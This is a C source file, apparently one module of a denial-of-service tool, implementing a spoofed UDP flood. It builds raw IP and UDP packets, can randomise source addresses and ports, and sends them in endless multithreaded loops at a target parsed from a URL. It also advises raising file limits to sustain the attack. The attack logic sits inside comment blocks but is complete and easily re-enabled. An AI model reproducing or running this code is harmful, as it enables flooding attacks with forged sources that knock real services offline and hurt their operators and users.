#include <stdio.h> // printf/fprintf
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <signal.h>
#include <errno.h>
#include <pthread.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <signal.h>

#include <netinet/ip.h>  // struct ip
#include <sys/socket.h>  // socket()
#include <netinet/in.h>  // struct sockadd
#include <netinet/udp.h> // struct udp
#include <arpa/inet.h>

#include "../main.h"
#include "../debug.h"

#include "udp_flood.h"

static int SendUDP(const pUDPStruct us, const int debug_level)
{

    /*
    int socket_fd;
    socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (socket_fd < 0)
    {
        ErrorMessage("Create socket failed: %s(%d)", strerror(errno), errno);
        if (errno == 1)
        {
            DebugMessage("This program should run as root user");
        }
        else if (errno == 24)
        {
            DebugMessage("You shoud check max file number use 'ulimit -n' in linux");
            DebugMessage("And change the max file number use 'ulimit -n <setting number>'");
            DebugMessage("Or you can change the EACH_IP_REPEAT_TIME value to delay the attack end time");
        }
        return 1;
    }

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    // dst
    sin.sin_port = htons((int)us->dst_port);
    sin.sin_addr.s_addr = inet_addr(us->dst_ip);

    char *datagram, *data;
    int pksize = sizeof(struct ip) + sizeof(struct udphdr) + PADDING_SIZE;
    datagram = (char *)malloc(pksize);

    struct ip *iph;
    iph = (struct ip *)datagram;

    struct udphdr *udph;
    udph = (struct udphdr *)(datagram + sizeof(struct ip));

    data = (char *)(datagram + sizeof(struct ip) + sizeof(struct udphdr));

    memset(datagram, 0, pksize);
    // filed the data
    memcpy((char *)data, "x", PADDING_SIZE);

    int one = 1;
    const int *val = &one;
    if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        ErrorMessage("Error setting IP_HDRINCL: %s(%d)", strerror(errno), errno);
        //exit(0);
        return 1;
    }

    // entete ip
    iph->ip_v = 4;
    iph->ip_hl = 5;
    iph->ip_tos = 0;
    iph->ip_len = pksize;
    iph->ip_ttl = 255;
    iph->ip_off = 0;
    iph->ip_id = sizeof(45);
    iph->ip_p = IPPROTO_UDP;
    iph->ip_sum = 0; // a remplir aprés
    iph->ip_src.s_addr = inet_addr(us->src_ip);
    iph->ip_dst.s_addr = inet_addr(us->dst_ip);

    // entete udp
    udph->uh_sport = htons(us->src_port);
    udph->uh_dport = htons(us->dst_port);
    udph->uh_ulen = htons(sizeof(struct udphdr) + PADDING_SIZE);
    udph->uh_sum = CalculateSum((unsigned short *)udph, sizeof(struct udphdr) + PADDING_SIZE);

    // envoi
    int i;
    for (i = 0; i < us->each_ip_repeat; i++)
    {
        if (sendto(
                socket_fd,
                datagram,
                pksize,
                0,
                (struct sockaddr *)&sin,
                sizeof(struct sockaddr)) < 0)
        {
            ErrorMessage("Attack send failed");
        }
    }

    //libere la memoire
    free(datagram);
    close(socket_fd);
    */
    return 0;
}

static void FreeUDPStrutBuff(pUDPStruct input)
{
    // free
    if (input)
    {
        if (input->dst_ip)
        {
            free(input->dst_ip);
        }
        free(input);
    }
}

static int AttackThread(const pParameter input)
{
    // here is udp flood thread

    /*
    pUDPStruct udp_struct = (pUDPStruct)malloc(sizeof(UDPStruct));
    pSplitUrlRet split_result;
    int i;

    if (!SplitUrl(input->address, &split_result))
    {
        ErrorMessage("AttackThread SplitUrl failed");
        return 1;
    }
    ShowMessage(DEBUG, input->debug_mode, "split_reult: %s", split_result->protocol);
    ShowMessage(DEBUG, input->debug_mode, "split_reult: %s", split_result->host);
    ShowMessage(DEBUG, input->debug_mode, "split_reult: %d", split_result->port);
    ShowMessage(DEBUG, input->debug_mode, "split_reult: %s", split_result->suffix);
    if (split_result->port == 0)
    {
        if (strlen(split_result->host) == 0)
        {
            ErrorMessage("AttackThread SplitUrl not right");
            return 1;
        }
        // make the port as default
        split_result->port = UDP_FLOOD_PORT_DEFAULT;
    }
    // init the target ip and port
    udp_struct->dst_ip = (char *)malloc(IP_BUFFER_SIZE);
    if (!(udp_struct->dst_ip))
    {
        ErrorMessage("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
        return 1;
    }
    if (!memset(udp_struct->dst_ip, 0, IP_BUFFER_SIZE))
    {
        ErrorMessage("AttackThread memset failed: %s(%d)", strerror(errno), errno);
        return 1;
    }
    if (!strncpy(udp_struct->dst_ip, split_result->host, strlen(split_result->host)))
    {
        ErrorMessage("AttackThread strncpy failed: %s(%d)", strerror(errno), errno);
        return 1;
    }
    udp_struct->dst_port = split_result->port;
    FreeSplitUrlBuff(split_result);
    udp_struct->each_ip_repeat = input->each_ip_repeat;

    ShowMessage(VERBOSE, input->debug_mode, "AttackThread start sending data...");
    for (;;)
    {
        if (input->random_source_ip_address == ENABLE_SIP)
        {
            // randome ip and port
            if (!GetRandomIP(&(udp_struct->src_ip)))
            {
                ErrorMessage("AttackThread GetRandomIP failed");
                return 1;
            }
            // this function has no failed
            GetRandomPort(&(udp_struct->src_port));
        }
        else
        {
            // use the static ip and port
            if (!strncpy(udp_struct->src_ip, DEFAULT_ADDRESS, strlen(DEFAULT_ADDRESS)))
            {
                ErrorMessage("AttackThread copy SIP_ADDRESS failed: %s(%d)", strerror(errno), errno);
                return 1;
            }
            udp_struct->src_port = (int)DEFAULT_PORT;
        }

        // rport is random source port
        for (i = 0; i < input->each_ip_repeat; i++)
        {
            if (SendUDP(udp_struct, input->debug_mode))
            {
                ErrorMessage("AttackThread Attack failed");
                //return 1;
            }
        }
        FreeRandomIPBuff(udp_struct->src_ip);
    }
    FreeUDPStrutBuff(udp_struct);
    */
    return 0;
}

int StartUDPFloodAttack(const pParameter input)
{
    // run function in thread
    // this attack type must run as root

    /*
    pthread_t tid[input->max_thread];
    pthread_attr_t attr;
    int j, ret;

    ShowMessage(VERBOSE, input->debug_mode, "Enter StartUDPFloodAttack");

    extern void SignalExit(int signo);
    signal(SIGINT, SignalExit);
    // unlimit loop
    for (;;)
    {
        // only one process
        for (j = 0; j < input->max_thread; j++)
        {
            //input->serial_num = (i * input->max_thread) + j;
            if (pthread_attr_init(&attr))
            {
                ErrorMessage("StartUDPFloodAttack pthread_attr_init failed");
                return 1;
            }
            //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
            if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
            {
                ErrorMessage("StartUDPFloodAttack pthread_attr_setdetachstate failed");
                return 1;
            }
            // create thread
            ret = pthread_create(&tid[j], &attr, (void *)AttackThread, input);
            //printf("j is: %d\n", j);
            ShowMessage(DEBUG, input->debug_mode, "tid: %ld", tid[j]);
            // here we make a map
            if (ret != 0)
            {
                ShowMessage(DEBUG, input->debug_mode, "ret: %d", ret);
                ErrorMessage("Create pthread failed");
                return 1;
            }
            pthread_attr_destroy(&attr);
        }
        //pthread_detach(tid);
        // join them all
        for (j = 0; j < input->max_thread; j++)
        {
            pthread_join(tid[j], NULL);
        }
    }
    */
    return 0;
}

int StartUDPFloodTest(const pParameter input)
{
    // for test
    ShowMessage(VERBOSE, input->debug_mode, "Enter StartUDPFloodTest");
    AttackThread(input);
    return 0;
}
